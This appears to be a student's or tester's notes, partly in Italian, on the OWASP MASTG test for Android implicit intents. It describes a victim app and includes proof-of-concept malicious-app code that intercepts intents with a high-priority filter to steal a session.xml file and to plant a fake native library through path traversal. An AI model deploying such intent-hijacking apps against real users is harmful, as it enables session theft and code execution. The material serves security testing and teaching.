# [MASTG-TEST-0026: Testing Implicit Intents](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0026/)

## Implementation

- Creato app che dopo aver fatto il login ti permetto di “aggiugere “una credit card
- L’activity `AddCardActivity` ha come name dell’intent:
    
    ```java
            <activity
                android:name=".AddCardActivity"
                android:exported="false" >
                <intent-filter>
                    <action android:name="com.victim.ADD_CARD_ACTION" />
                    <category android:name="android.intent.category.DEFAULT" />
                </intent-filter>
            </activity>
    ```
    
- per l’exploit è stata seguita la seguente guida citata nell’owasp : [https://blog.oversecured.com/Interception-of-Android-implicit-intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents#insecure-activity-launches)
    
    in breve si crea un’altra app che avrà intent name uguale a quella della vittima ma con la priorità maggiore diconseguenza quando l’intent verrà lanciato l’app che ha priorità maggiore lo catturerà.

## Overview
When testing for implicit intents you need to check if they are vulnerable to injection attacks or potentially leaking sensitive data.
MASVS-CODE-4 / MSTG-PLATFORM-2 / May 08, 2023
## Static Analysis
Inspect the Android Manifest and look for any <intent> signatures defined inside blocks ↗ (which specify the set of other apps an app intends to interact with), check if it contains any system actions (e.g. `android.intent.action.GET_CONTENT`, `android.intent.action.PICK`, `android.media.action.IMAGE_CAPTURE`, etc.) and browse the source code for their occurrence.

For example, the following Intent doesn't specify any concrete component, meaning that it's an implicit intent. It sets the action android.intent.action.GET_CONTENT to ask the user for input data and then the app starts the intent by startActivityForResult and specifying an image chooser.

```
Intent intent = new Intent();
intent.setAction("android.intent.action.GET_CONTENT");
startActivityForResult(Intent.createChooser(intent, ""), REQUEST_IMAGE);
```
The app uses `startActivityForResult `instead of `startActivity`, indicating that it expects a result (in this case an image), so you should check how the return value of the intent is handled by looking for the `onActivityResult` callback. If the return value of the intent isn't properly validated, an attacker may be able to read arbitrary files or execute arbitrary code from the app's internal `/data/data/' storage. A full description of this type of attack can be found in the [following blog post](https://blog.oversecured.com/Interception-of-Android-implicit-intents).

## Case 1: Arbitrary File Read¶
In this example we're going to see how an attacker can read arbitrary files from within the app's internal storage `/data/data/<appname> `due to the improper validation of the return value of the intent.

The performAction method in the following example reads the implicit intents return value, which can be an attacker provided URI and hands it to `getFileItemFromUri`. This method copies the file to a temp folder, which is usual if this file is displayed internally. But if the app stores the URI provided file in an external temp directory e.g by calling getExternalCacheDir or `getExternalFilesDir` an attacker can read this file if he sets the permission` android.permission.READ_EXTERNAL_STORAGE`.
```
private void performAction(Action action){
  ...
  Uri data = intent.getData();
  if (!(data == null || (fileItemFromUri = getFileItemFromUri(data)) == null)) {
      ...
  }
}

private FileItem getFileItemFromUri(Context, context, Uri uri){
  String fileName = UriExtensions.getFileName(uri, context);
  File file = new File(getExternalCacheDir(), "tmp");
  file.createNewFile();
  copy(context.openInputStream(uri), new FileOutputStream(file));
  ...
}```
The following is the source of a malicious app that exploits the above vulnerable code.

AndroidManifest.xml
```
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<application>
  <activity android:name=".EvilContentActivity">
      <intent-filter android:priority="999">
          <action android:name="android.intent.action.GET_CONTENT" />
          <data android:mimeType="*/*" />
      </intent-filter>
  </activity>
</application>
```
EvilContentActivity.java
```
public class EvilContentActivity extends Activity{
  @Override
  protected void OnCreate(@Nullable Bundle savedInstanceState){
    super.OnCreate(savedInstanceState);
    setResult(-1, new Intent().setData(Uri.parse("file:///data/data/<victim_app>/shared_preferences/session.xml")));
    finish();
  }
}
```
If the user selects the malicious app to handle the intent, the attacker can now steal the session.xml file from the app's internal storage. In the previous example, the victim must explicitly select the attacker's malicious app in a dialog. However, developers may choose to suppress this dialog and automatically determine a recipient for the intent. This would allow the attack to occur without any additional user interaction.

The following code sample implements this automatic selection of the recipient. By specifying a priority in the malicious app's intent filter, the attacker can influence the selection sequence.
```
Intent intent = new Intent("android.intent.action.GET_CONTENT");
for(ResolveInfo info : getPackageManager().queryIntentActivities(intent, 0)) {
    intent.setClassName(info.activityInfo.packageName, info.activityInfo.name);
    startActivityForResult(intent);
    return;
}
```
## Case 2: Arbitrary Code Execution¶
An improperly handled return value of an implicit intent can lead to arbitrary code execution if the victim app allows `content://` and `file://` URLs.

An attacker can implement a ContentProvider that contains public `Cursor query(...)` to set an arbitrary file (in this case lib.so), and if the victim loads this file from the content provider by executing copy the attacker's `ParcelFileDescriptor` openFile(...) method will be executed and return a malicious fakelib.so.

AndroidManifest.xml
```
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<application>
  <activity android:name=".EvilContentActivity">
      <intent-filter android:priority="999">
          <action android:name="android.intent.action.GET_CONTENT" />
          <data android:mimeType="*/*" />
      </intent-filter>
  </activity>
  <provider android:name=".EvilContentProvider" android:authorities="com.attacker.evil" android:enabled="true" android:exported="true"></provider>
</application>
```
EvilContentProvider.java

```
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
    matrixCursor.addRow(new Object[]{"../lib-main/lib.so"});
    return matrixCursor;
}
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    return ParcelFileDescriptor.open(new File("/data/data/com.attacker/fakelib.so"), ParcelFileDescriptor.MODE_READ_ONLY);
}
```
EvilContentActivity.java

```
public class EvilContentActivity extends Activity{
  @Override
  protected void OnCreate(@Nullable Bundle savedInstanceState){
    super.OnCreate(savedInstanceState);
    setResult(-1, new Intent().setData(Uri.parse("content:///data/data/com.attacker/fakelib.so")));
    finish();
  }
}
```